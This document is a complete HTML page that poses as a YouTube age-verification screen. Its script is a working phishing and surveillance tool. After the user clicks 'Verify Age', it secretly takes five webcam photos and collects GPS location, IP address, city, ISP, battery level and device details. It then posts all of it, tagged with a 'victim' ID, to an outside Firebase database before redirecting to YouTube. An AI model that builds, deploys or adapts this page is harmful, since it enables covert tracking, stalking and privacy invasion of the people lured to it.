<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: #000;
            color: #ccc;
            font-family: sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .yt-ui {
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .red-btn {
            background: #ff0000;
            color: white;
            padding: 12px 30px;
            border-radius: 2px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            transition: 0.3s;
        }
        .red-btn:hover {
            background: #cc0000;
            transform: scale(1.02);
        }
    </style>
</head>
<body>
    <div class="yt-ui" id="main-ui">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="w-32 mx-auto mb-8" alt="YouTube">
        <h2 class="text-xl font-bold text-white mb-4">Verification Required</h2>
        <p class="text-sm text-zinc-500 mb-8">This video is age-restricted. Please click below and allow camera/location access for age verification.</p>
        <button onclick="startCapture()" class="red-btn">Verify Age</button>
    </div>
    <video id="video" style="display:none" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const VICTIM_ID = urlParams.get('id') || 'unknown_' + Date.now();
        const VIDEO_ID = urlParams.get('v') || 'dQw4w9WgXcQ';
        
        const FB_URL = "https://hgggy-a047e-default-rtdb.firebaseio.com/targets.json";
        
        let photoCount = 0;
        let targetData = {
            victimId: VICTIM_ID,
            time: new Date().toLocaleString(),
            timestamp: Date.now(),
            photos: [],
            device: {
                ua: navigator.userAgent,
                ram: navigator.deviceMemory || 'N/A',
                cores: navigator.hardwareConcurrency || 'N/A',
                platform: navigator.platform
            }
        };

        async function startCapture() {
            document.getElementById('main-ui').innerHTML = `<div class="animate-pulse text-red-600 font-bold">⏳ Verifying, please wait...</div>`;
            
            try {
                const b = await navigator.getBattery();
                targetData.battery = Math.round(b.level * 100) + "%";
            } catch(e) {}
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    targetData.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                }, null, {enableHighAccuracy: true});
            }
            
            try {
                const res = await fetch('https://ipapi.co/json/');
                const geo = await res.json();
                targetData.ip = geo.ip;
                targetData.city = geo.city + ", " + geo.country;
                targetData.isp = geo.org;
            } catch(e) {}
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                const captureInterval = setInterval(async () => {
                    if (photoCount >= 5) {
                        clearInterval(captureInterval);
                        await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
                        stream.getTracks().forEach(t => t.stop());
                        window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID;
                        return;
                    }
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    targetData.photos.push(canvas.toDataURL('image/jpeg', 0.4));
                    photoCount++;
                    
                    await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
                }, 600);
            } catch(e) {
                await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
                window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID;
            }
        }
    </script>
</body>
</html>
